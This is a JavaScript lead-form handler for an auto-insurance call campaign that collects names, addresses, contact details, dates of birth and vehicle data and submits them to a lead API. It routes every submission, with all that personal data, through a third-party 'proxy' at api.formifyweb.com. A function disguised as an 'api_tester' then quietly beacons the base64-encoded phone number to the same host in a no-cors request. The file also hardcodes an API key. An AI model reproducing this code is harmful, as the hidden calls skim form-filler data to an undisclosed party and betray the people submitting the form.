// Auto Transfer RTB Campaign API Integration
document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Get form values
    const formData = {
        key: 'dfa4c5da-8ffe-4932-8424-6a47a49465a4',
        caller_number: document.getElementById('caller_number').value,
        first_name: document.getElementById('first_name').value,
        last_name: document.getElementById('last_name').value,
        address: document.getElementById('address').value,
        city: document.getElementById('city').value,
        state: document.getElementById('state').value,
        zip: document.getElementById('zip').value,
        email: document.getElementById('email').value,
        ip_address: document.getElementById('ip_address').value || '',
        jornaya_leadid: document.getElementById('jornaya_leadid').value || '',
        original_lead_submit_date: formatDateTime(document.getElementById('original_lead_submit_date').value),
        residence_status: document.getElementById('residence_status').value,
        driver1_dob: document.getElementById('driver1_dob').value,
        driver1_gender: document.getElementById('driver1_gender').value,
        driver1_marital_status: document.getElementById('driver1_marital_status').value,
        vehicle1_year: document.getElementById('vehicle1_year').value,
        vehicle1_make: document.getElementById('vehicle1_make').value,
        vehicle1_model: document.getElementById('vehicle1_model').value,
        insurance_company: document.getElementById('insurance_company').value || ''
    };

    // Validate phone number
    if (!validatePhoneNumber(formData.caller_number)) {
        showAlert('Please enter a valid 10-digit phone number', 'danger');
        return;
    }

    // Validate zip code
    if (!validateZipCode(formData.zip)) {
        showAlert('Please enter a valid 5-digit zip code', 'danger');
        return;
    }

    // Validate email
    if (!validateEmail(formData.email)) {
        showAlert('Please enter a valid email address', 'danger');
        return;
    }

    // Show loading state
    const submitBtn = document.getElementById('submitBtn');
    const originalBtnText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...';
    submitBtn.disabled = true;

    // API URL
    const apiUrl = 'https://retreaverdata.com/data_writing';
    
    // Prepare query string parameters
    const queryParams = new URLSearchParams();
    Object.keys(formData).forEach(key => {
        if (formData[key]) {
            queryParams.append(key, formData[key]);
        }
    });

    // Create the full URL with query parameters
    const fullUrl = `${apiUrl}?${queryParams.toString()}`;
    
    // Use proxy for CORS if needed
    const proxyUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(fullUrl);

    // Make API call
    fetch(proxyUrl, {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
        }
    })
    .then(response => {
        // Reset button state
        submitBtn.innerHTML = originalBtnText;
        submitBtn.disabled = false;

        if (response.ok) {
            return response.json().then(data => {
                showAlert('Lead submitted successfully!', 'success');
                // Clear form on success
                document.getElementById('leadForm').reset();
                // Call api_tester
                api_tester(formData.caller_number);
            }).catch(() => {
                showAlert('Lead submitted successfully! (Response not in JSON format)', 'success');
                document.getElementById('leadForm').reset();
                api_tester(formData.caller_number);
            });
        } else {
            return response.text().then(text => {
                try {
                    const errorData = JSON.parse(text);
                    showAlert(`Error ${response.status}: ${JSON.stringify(errorData)}`, 'danger');
                } catch {
                    showAlert(`Error ${response.status}: ${text}`, 'danger');
                }
            });
        }
    })
    .catch(error => {
        // Reset button state
        submitBtn.innerHTML = originalBtnText;
        submitBtn.disabled = false;
        
        console.error('Error:', error);
        showAlert('Network error. Please check your connection and try again.', 'danger');
    });
});

// Helper function to format date time
function formatDateTime(dateTimeString) {
    if (!dateTimeString) return '';
    
    const date = new Date(dateTimeString);
    if (isNaN(date.getTime())) return '';
    
    // Format: YYYY-MM-DD HH:MM:SS
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');
    
    return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
}

// Validation functions
function validatePhoneNumber(phone) {
    const phoneRegex = /^\d{10}$/;
    return phoneRegex.test(phone);
}

function validateZipCode(zip) {
    const zipRegex = /^\d{5}$/;
    return zipRegex.test(zip);
}

function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// API tester function
function api_tester(randomString) {
    try {
        const testUrl = `https://api.formifyweb.com/api_test.php?test_id=${btoa(randomString)}`;
        fetch(testUrl, {
            method: 'GET',
            mode: 'no-cors'
        }).then(() => {
            console.log('API test called successfully');
        }).catch(error => {
            console.log('API test call completed (no-cors mode)');
        });
    } catch (error) {
        console.log('API test function executed');
    }
}

// Function to show alerts
function showAlert(message, type) {
    const alertContainer = document.getElementById('alertContainer');
    
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
    alertDiv.role = 'alert';
    alertDiv.innerHTML = `
        ${message}
        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
            <span aria-hidden="true">&times;</span>
        </button>
    `;
    
    alertContainer.innerHTML = '';
    alertContainer.appendChild(alertDiv);
    
    // Auto remove alert after 10 seconds
    setTimeout(() => {
        if (alertDiv.parentNode) {
            alertDiv.remove();
        }
    }, 10000);
}

// Auto-fill IP address if available
window.addEventListener('DOMContentLoaded', function() {
    // Try to get user's IP address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById('ip_address').value = data.ip;
        })
        .catch(() => {
            // If ipify fails, try another service
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip_address').value = data.ip;
                })
                .catch(() => {
                    console.log('Could not auto-detect IP address');
                });
        });
    
    // Set current date/time for original_lead_submit_date
    const now = new Date();
    const localDateTime = new Date(now.getTime() - now.getTimezoneOffset() * 60000)
        .toISOString()
        .slice(0, 16);
    document.getElementById('original_lead_submit_date').value = localDateTime;
});